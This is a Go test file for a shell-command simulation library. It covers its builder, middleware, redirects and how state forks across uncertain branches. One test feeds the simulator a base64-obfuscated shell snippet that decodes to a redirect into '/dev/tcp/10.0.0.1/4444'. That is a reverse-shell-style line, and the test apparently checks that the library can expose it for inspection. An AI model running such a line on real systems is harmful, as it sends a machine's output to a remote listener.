package libcommand_test

import (
	"context"
	"reflect"
	"testing"

	libcommand "github.com/nullptrpanic/libcommand"
)

func TestSimulationRequestPublicFields(t *testing.T) {
	typeOfRequest := reflect.TypeOf(libcommand.SimulationRequest{})
	fields := make([]string, typeOfRequest.NumField())
	for index := range fields {
		fields[index] = typeOfRequest.Field(index).Name
	}
	want := []string{"Source", "Env", "Args", "Stdin", "Files", "WorkingDir", "User"}
	if !reflect.DeepEqual(fields, want) {
		t.Fatalf("SimulationRequest fields = %#v, want %#v", fields, want)
	}
}

func TestPublicCommandTypes(t *testing.T) {
	invocation := &libcommand.Invocation{Name: "lark-cli"}
	result := &libcommand.CommandResult{Action: libcommand.CommandStop}
	if invocation.Name != "lark-cli" || result.Action != libcommand.CommandStop {
		t.Fatal("public command types are unavailable from the root package")
	}
}

func TestPublicUnifiedCommandAPI(t *testing.T) {
	var _ func(*libcommand.CommandContext, string) *libcommand.CommandResult = (*libcommand.CommandContext).StopUnresolved
	var _ func(*libcommand.CommandContext, string) error = (*libcommand.CommandContext).ChangeUser

	var command libcommand.Command = func(_ context.Context, current *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
		return &libcommand.CommandResult{Stdout: []byte(current.State().Directory())}, nil
	}
	simulator := libcommand.NewBuilder().Command("inspect", command).Build()
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: "inspect"}); err != nil {
		t.Fatal(err)
	}
}

func TestCommandContextExposesExpandedRedirects(t *testing.T) {
	var got [][]*libcommand.Redirect
	simulator := libcommand.NewBuilder().
		Command("probe", func(_ context.Context, command *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
			var redirects []*libcommand.Redirect
			for _, redirect := range command.Redirects() {
				copied := *redirect
				redirects = append(redirects, &copied)
			}
			got = append(got, redirects)
			return &libcommand.CommandResult{}, nil
		}).
		Build()
	source := `target=$(printf '%s' L2Rldi90Y3AvMTAuMC4wLjEvNDQ0NA== | base64 -d)
probe >"$target" 2>&1
probe`
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: source}); err != nil {
		t.Fatal(err)
	}
	want := []*libcommand.Redirect{
		{FD: 1, Operator: ">", Target: "/dev/tcp/10.0.0.1/4444"},
		{FD: 2, Operator: ">&", Target: "1"},
	}
	if len(got) < 2 || !reflect.DeepEqual(got[0], want) {
		t.Fatalf("redirects = %#v, want first call %#v and subsequent calls without redirects", got, want)
	}
	for _, redirects := range got[1:] {
		if len(redirects) != 0 {
			t.Fatalf("subsequent redirects = %#v, want none", redirects)
		}
	}
}

func TestPublicArgumentKinds(t *testing.T) {
	resolved := &libcommand.Argument{Kind: libcommand.ArgumentString, Value: "chat"}
	unresolved := &libcommand.Argument{Kind: libcommand.ArgumentUnresolved}
	invocation := &libcommand.Invocation{Args: []*libcommand.Argument{resolved, unresolved}}
	if invocation.Args[0].Value != "chat" || invocation.Args[1].Kind != libcommand.ArgumentUnresolved {
		t.Fatalf("arguments = %#v", invocation.Args)
	}
}

func TestPublicAPI(t *testing.T) {
	var _ func(*libcommand.Simulator, context.Context, *libcommand.SimulationRequest) error = (*libcommand.Simulator).Simulate

	var got *libcommand.Invocation
	handler := func(_ context.Context, _ *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
		got = invocation
		return &libcommand.CommandResult{}, nil
	}

	simulator := libcommand.NewBuilder().Command("lark-cli", handler).Build()
	if simulator == nil {
		t.Fatal("Build returned nil")
	}
	if got != nil {
		t.Fatal("handler ran during Build")
	}
}

func TestPublicStateMutation(t *testing.T) {
	var observed string
	simulator := libcommand.NewBuilder().
		Command("mutate", func(_ context.Context, command *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
			if err := command.State().SetVariable("VALUE", "changed"); err != nil {
				return nil, err
			}
			return &libcommand.CommandResult{}, nil
		}).
		Command("observe", func(_ context.Context, command *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
			observed, _, _ = command.State().Variable("VALUE")
			return &libcommand.CommandResult{}, nil
		}).
		Build()
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: "mutate; observe"}); err != nil {
		t.Fatal(err)
	}
	if observed != "changed" {
		t.Fatalf("observed state value = %q, want changed", observed)
	}
}

func TestStatePathIdentityIsAvailableWithoutTrace(t *testing.T) {
	pathIDs := make(map[string][]uint64)
	parentIDs := make(map[string][]uint64)
	grandparentIDs := make(map[string][]uint64)
	parentPointers := make(map[string][]uintptr)
	simulator := libcommand.NewBuilder().
		Command("record", func(_ context.Context, command *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
			if len(invocation.Args) != 1 || invocation.Args[0].Kind != libcommand.ArgumentString {
				t.Fatalf("record arguments = %#v, want one concrete label", invocation.Args)
			}
			label := invocation.Args[0].Value
			state := command.State()
			pathIDs[label] = append(pathIDs[label], state.PathID())
			parent := state.Parent()
			if parent == nil {
				parentIDs[label] = append(parentIDs[label], 0)
				grandparentIDs[label] = append(grandparentIDs[label], 0)
				parentPointers[label] = append(parentPointers[label], 0)
				return &libcommand.CommandResult{}, nil
			}
			parentIDs[label] = append(parentIDs[label], parent.PathID())
			parentPointers[label] = append(parentPointers[label], reflect.ValueOf(parent).Pointer())
			grandparent := parent.Parent()
			if grandparent == nil {
				grandparentIDs[label] = append(grandparentIDs[label], 0)
			} else {
				grandparentIDs[label] = append(grandparentIDs[label], grandparent.PathID())
			}
			return &libcommand.CommandResult{}, nil
		}).
		Command("maybe", func(_ context.Context, command *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
			return command.ResultUnknown(&libcommand.CommandResult{}, false, false, true), nil
		}).
		Build()

	source := `record root
if maybe; then
  record left
  if maybe; then record left-yes; else record left-no; fi
else
  record right
fi`
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: source}); err != nil {
		t.Fatal(err)
	}

	rootID := onlyUint64(t, pathIDs, "root")
	if rootID == 0 || onlyUint64(t, parentIDs, "root") != 0 {
		t.Fatalf("root path = %d parent %d, want nonzero path with no parent", rootID, onlyUint64(t, parentIDs, "root"))
	}
	leftID := onlyUint64(t, pathIDs, "left")
	rightID := onlyUint64(t, pathIDs, "right")
	leftParentPointer := onlyUintptr(t, parentPointers, "left")
	if leftID == rightID || onlyUint64(t, parentIDs, "left") != rootID || onlyUint64(t, parentIDs, "right") != rootID ||
		leftParentPointer == 0 || onlyUintptr(t, parentPointers, "right") != leftParentPointer {
		t.Fatalf("first fork: root=%d left=%d/%d right=%d/%d, want distinct children sharing one root snapshot", rootID, leftID, onlyUint64(t, parentIDs, "left"), rightID, onlyUint64(t, parentIDs, "right"))
	}
	leftYesID := onlyUint64(t, pathIDs, "left-yes")
	leftNoID := onlyUint64(t, pathIDs, "left-no")
	if leftYesID == leftNoID || onlyUint64(t, parentIDs, "left-yes") != leftID || onlyUint64(t, parentIDs, "left-no") != leftID ||
		onlyUint64(t, grandparentIDs, "left-yes") != rootID || onlyUint64(t, grandparentIDs, "left-no") != rootID {
		t.Fatalf("nested fork: root=%d left=%d yes=%d/%d no=%d/%d, want distinct children of left", rootID, leftID, leftYesID, onlyUint64(t, parentIDs, "left-yes"), leftNoID, onlyUint64(t, parentIDs, "left-no"))
	}
	if onlyUint64(t, parentIDs, "left") != rootID || onlyUint64(t, grandparentIDs, "left") != 0 {
		t.Fatal("later forks changed an existing parent relationship")
	}
}

func TestStatePathIdentityForksBeforeSubstitutionContinuation(t *testing.T) {
	pathIDs := make(map[string][]uint64)
	parentIDs := make(map[string][]uint64)
	simulator := libcommand.NewBuilder().
		Command("record", func(_ context.Context, command *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
			if len(invocation.Args) != 1 || invocation.Args[0].Kind != libcommand.ArgumentString {
				t.Fatalf("record arguments = %#v, want one concrete label", invocation.Args)
			}
			label := invocation.Args[0].Value
			state := command.State()
			pathIDs[label] = append(pathIDs[label], state.PathID())
			parentID := uint64(0)
			if parent := state.Parent(); parent != nil {
				parentID = parent.PathID()
			}
			parentIDs[label] = append(parentIDs[label], parentID)
			return &libcommand.CommandResult{}, nil
		}).
		Command("maybe", func(_ context.Context, command *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
			return command.ResultUnknown(&libcommand.CommandResult{}, false, false, true), nil
		}).
		Build()

	source := `record root
record "$(if maybe; then printf substitution-left; else printf substitution-right; fi)"`
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: source}); err != nil {
		t.Fatal(err)
	}

	rootID := onlyUint64(t, pathIDs, "root")
	leftID := onlyUint64(t, pathIDs, "substitution-left")
	rightID := onlyUint64(t, pathIDs, "substitution-right")
	if leftID == rightID || onlyUint64(t, parentIDs, "substitution-left") != rootID || onlyUint64(t, parentIDs, "substitution-right") != rootID {
		t.Fatalf("substitution fork: root=%d left=%d/%d right=%d/%d, want distinct children of root", rootID, leftID, onlyUint64(t, parentIDs, "substitution-left"), rightID, onlyUint64(t, parentIDs, "substitution-right"))
	}
}

func TestParentStateIsFrozenAtFork(t *testing.T) {
	var observations int
	simulator := libcommand.NewBuilder().
		Command("inspect", func(_ context.Context, command *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
			currentValue, currentExists, currentResolved := command.State().Variable("VALUE")
			if currentValue != "before" || !currentExists || !currentResolved {
				t.Fatalf("child VALUE = %q, %v, %v, want before, true, true", currentValue, currentExists, currentResolved)
			}
			parent := command.State().Parent()
			if parent == nil {
				t.Fatal("forked state has no parent")
			}
			value, exists, resolved := parent.Variable("VALUE")
			if value != "before" || !exists || !resolved {
				t.Fatalf("parent VALUE = %q, %v, %v, want before, true, true", value, exists, resolved)
			}
			if err := parent.SetVariable("VALUE", "polluted"); err == nil {
				t.Fatal("parent state mutation succeeded")
			}
			if err := command.State().SetVariable("VALUE", invocation.Args[0].Value); err != nil {
				return nil, err
			}
			observations++
			return &libcommand.CommandResult{}, nil
		}).
		Command("maybe", func(_ context.Context, command *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
			return command.ResultUnknown(&libcommand.CommandResult{}, false, false, true), nil
		}).
		Build()

	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: `VALUE=before; if maybe; then inspect left; else inspect right; fi`}); err != nil {
		t.Fatal(err)
	}
	if observations != 2 {
		t.Fatalf("observations = %d, want 2", observations)
	}
}

func onlyUint64(t *testing.T, values map[string][]uint64, label string) uint64 {
	t.Helper()
	observations := values[label]
	if len(observations) != 1 {
		t.Fatalf("values[%q] = %v, want one observation", label, observations)
	}
	return observations[0]
}

func onlyUintptr(t *testing.T, values map[string][]uintptr, label string) uintptr {
	t.Helper()
	observations := values[label]
	if len(observations) != 1 {
		t.Fatalf("values[%q] = %v, want one observation", label, observations)
	}
	return observations[0]
}

func TestBuilderUsesLastCommandRegistration(t *testing.T) {
	var calls []string
	first := func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
		calls = append(calls, "first")
		return &libcommand.CommandResult{}, nil
	}
	second := func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
		calls = append(calls, "second")
		return &libcommand.CommandResult{}, nil
	}
	simulator := libcommand.NewBuilder().
		Command("record", first).
		Command("record", second).
		Build()
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: "record"}); err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(calls, []string{"second"}) {
		t.Fatalf("calls = %#v, want second registration", calls)
	}
}

func TestBuilderCommandMiddlewareWrapsAllCommandKinds(t *testing.T) {
	var calls []string
	record := func(next libcommand.Command) libcommand.Command {
		return func(ctx context.Context, command *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
			calls = append(calls, invocation.Name)
			return next(ctx, command, invocation)
		}
	}
	success := func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
		return &libcommand.CommandResult{}, nil
	}

	simulator := libcommand.NewBuilder().
		Middleware(record).
		Command("custom", success).
		Command("*", success).
		Build()
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{
		Source: "echo builtin; custom; external",
	}); err != nil {
		t.Fatal(err)
	}
	if want := []string{"echo", "custom", "external"}; !reflect.DeepEqual(calls, want) {
		t.Fatalf("middleware calls = %#v, want %#v", calls, want)
	}
}

func TestBuilderCommandMiddlewareUsesRegistrationOrder(t *testing.T) {
	var calls []string
	middleware := func(name string) libcommand.CommandMiddleware {
		return func(next libcommand.Command) libcommand.Command {
			return func(ctx context.Context, command *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
				calls = append(calls, name+" before")
				result, err := next(ctx, command, invocation)
				calls = append(calls, name+" after")
				return result, err
			}
		}
	}

	simulator := new(libcommand.Builder).
		Middleware(middleware("first"), middleware("second")).
		Command("record", func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
			calls = append(calls, "command")
			return &libcommand.CommandResult{}, nil
		}).
		Build()
	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: "record"}); err != nil {
		t.Fatal(err)
	}
	want := []string{"first before", "second before", "command", "second after", "first after"}
	if !reflect.DeepEqual(calls, want) {
		t.Fatalf("calls = %#v, want %#v", calls, want)
	}
}

func TestBuilderAcceptsShellCommandNames(t *testing.T) {
	handler := func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
		return &libcommand.CommandResult{}, nil
	}
	for _, name := range []string{".", "[", "break", "builtin", "command", "continue", "declare", "eval", "exec", "exit", "export", "let", "local", "readonly", "return", "source", "test", "typeset"} {
		t.Run(name, func(t *testing.T) {
			if simulator := libcommand.NewBuilder().Command(name, handler).Build(); simulator == nil {
				t.Fatal("Build() returned nil")
			}
		})
	}
}
